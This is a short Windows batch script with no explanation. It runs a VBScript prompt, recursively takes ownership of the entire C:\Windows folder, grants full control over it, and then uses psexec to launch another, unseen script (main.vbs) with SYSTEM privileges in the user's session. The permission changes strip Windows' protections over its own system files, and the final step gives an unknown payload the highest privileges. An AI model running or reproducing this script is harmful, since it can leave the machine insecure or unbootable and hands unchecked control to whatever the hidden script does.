@echo off
wscript tishi.vbs
cd /d "%~dp0"
icacls "C:\Windows" /setowner "SYSTEM" /T /C
icacls "C:\Windows" /grant SYSTEM:(OI)(CI)F /T /C /Q
icacls "C:\Windows" /grant Administrators:(OI)(CI)F /T /C /Q
psexec64 -nobanner -accepteula -s -i 1 ".\wscript.exe" "%~dp0main.vbs"